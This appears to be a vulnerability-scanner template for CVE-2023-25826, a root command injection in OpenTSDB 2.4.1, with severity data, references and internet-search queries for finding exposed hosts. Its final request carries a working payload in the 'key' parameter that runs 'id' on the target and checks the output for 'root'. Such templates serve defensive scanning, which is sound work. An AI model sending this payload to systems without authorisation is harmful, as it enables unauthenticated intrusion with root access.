id: CVE-2023-25826

info:
  name: OpenTSDB 2.4.1 Unauthenticated Command Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Due to insufficient validation of parameters passed to the legacy HTTP query API in OpenTSDB through version 2.4.1,
    it is possible to inject crafted OS commands into multiple parameters and execute malicious code on the host system.
    This vulnerability allows unauthenticated remote code execution as the root user.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary commands on the target system.
  remediation: |
    Upgrade to a patched version of OpenTSDB 2.4.2 or later to mitigate the vulnerability.
  reference:
    - http://packetstormsecurity.com/files/174570/OpenTSDB-2.4.1-Unauthenticated-Command-Injection.html
    - https://www.synopsys.com/blogs/software-security/opentsdb/
    - https://github.com/ErikWynter/opentsdb_key_cmd_injection
    - https://github.com/Loginsoft-Research/Linux-Exploit-Detection
    - https://github.com/getdrive/PoC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-25826
    cwe-id: CWE-78
    epss-score: 0.0017
    epss-percentile: 0.55151
    cpe: cpe:2.3:a:opentsdb:opentsdb:*:*:*:*:*:*:*:*
  metadata:
    vendor: opentsdb
    product: opentsdb
    shodan-query: html:"OpenTSDB"
    fofa-query:
      - body="opentsdb"
      - icon_hash=407286339

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/version"

    matchers:
      - type: word
        words:
          - "2.4.1"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/suggest?type=metrics"

    matchers:
      - type: word
        words:
          - "metrics"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/aggregators"

    matchers:
      - type: word
        words:
          - "aggregators"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/q?start=1h-ago&end=now&m=sum:rate:sys.cpu.nice&o=axis+x1y2&ylabel=CPU+Percentage&y2label=Memory+Usage&yrange=[0:]&y2range=[0:]&key=%3Bsystem%20%22id%22%20%22&wxh=1000x600&style=linespoint"

    matchers:
      - type: word
        words:
          - "root"
        part: body
